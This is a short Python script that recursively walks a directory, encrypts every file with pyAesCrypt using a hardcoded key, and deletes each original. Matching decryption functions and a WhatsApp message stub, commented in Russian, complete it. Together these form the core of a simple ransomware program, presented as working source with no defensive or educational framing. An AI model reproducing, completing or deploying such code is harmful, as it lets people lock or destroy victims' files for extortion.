import pywhatkit
import pyAesCrypt
import os

secret = 'abc'
def encryption(file,secret):
    buffer_size = 512*1024

    pyAesCrypt.encryptFile(
    str(file),
    str(file) + '.crp',
    secret,
    buffer_size
    )
    os.remove(file)

def decryption(file,secret):
    buffer_size = 512*1024

    pyAesCrypt.decryptFile(
    str(file),
    str(os.path.splitext(file)[0]),secret,
    buffer_size
    )
    os.remove(file)

def walkingencriptDir(dirr,secret):
    for file in os.listdir(dirr):
        path = os.path.join(dirr,file)
        print(path)
        if os.path.isfile(path):
            try:
                encryption(path,secret)
            except Exception as ex:
                print(ex)
        else:
            walkingencriptDir(path,secret)

def walkingdecryptDir(dirr,secret):
    for file in os.listdir(dirr):
        path = os.path.join(dirr,file)
        if os.path.isfile(path):
            try:
                decryption(path,secret)
            except Exception as ex:
                print(ex)
        else:
            walkingdecryptDir(path,secret)

#отправка сообщения в What's Up

def send_msg():
    pywhatkit.sendwhatmsg("", "Hi", time_hour=8, time_min=31)


